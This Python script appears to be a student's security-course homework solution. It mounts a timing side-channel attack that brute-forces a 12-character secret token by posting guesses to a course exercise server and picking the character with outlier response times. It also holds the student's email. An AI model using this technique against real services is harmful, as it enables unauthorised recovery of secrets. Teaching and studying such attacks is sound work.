import requests, time
import numpy as np

# potential characters used in token
# Create alphabet list of lowercase letters
alphabet = []
for letter in range(97,123):
    alphabet.append(chr(letter))

# create list of numbers
numbers = ["0", "1", "2", "3", "4", "5", "6", "7" ,"8", "9"]
chars = numbers + alphabet
print("chars:", chars)

# find the character that gives statistically different response time than others
def find_outlier(token, chars, idx, batch=5, sleep=0.05, threshold=2.0):
    found = False
    while not found:
        arr = np.zeros((5,len(chars)))
        for i in range(batch):
            row = np.zeros(len(chars))
            for j, c in enumerate(chars):
                time.sleep(sleep)
                candidate = token
                candidate[idx] = c
                response = requests.post("http://com402.epfl.ch/hw5/ex2", json={'email': "serif.serbest@epfl.ch", 'token': "".join(candidate)})
                arr[i, j] = response.elapsed.total_seconds()
            means = arr.mean(axis=0)
            z_scores = (means - means.mean()) / means.std()
            if (z_scores > threshold).any(): 
                found = True
            else:
                print("z_scores:", z_scores)
                print("Outlier can not detected. Trying another batch")
    return chars[z_scores.argmax()]

# detect outlier character for each index of token
token = [' ']*12
for i in range(12):
    c = find_outlier(token, chars, i)
    token[i] = c
    print(i, ''.join(token))

print("cracked token:", token)
# get secret token
response = requests.post("http://com402.epfl.ch/hw5/ex2", json={'email': "serif.serbest@epfl.ch", 'token': "".join(token)})
print(response.content)
